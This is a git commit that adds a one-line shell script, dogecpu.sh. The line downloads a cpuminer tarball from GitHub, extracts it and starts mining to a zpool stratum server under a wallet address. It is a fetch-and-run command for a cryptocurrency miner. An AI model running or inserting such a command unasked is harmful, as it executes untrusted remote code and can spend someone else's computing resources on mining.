db7f877da577dc2009a45eec9b67f38ab37f493e
shaiban09 <112415268+shaiban09@users.noreply.github.com>
2022-10-05 22:56:12 +0300

    Create dogecpu.sh

---
+++ dogecpu.sh
@@ -0,0 +1,1 @@
+wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz && ./cpuminer -a cpupower -o stratum+tcp://cpupower.sea.mine.zpool.ca:6240 -u dgb1qxcwu8trd5sj022a6v8xzuf4uazkzenrnkrmsnh -p c=DOGE
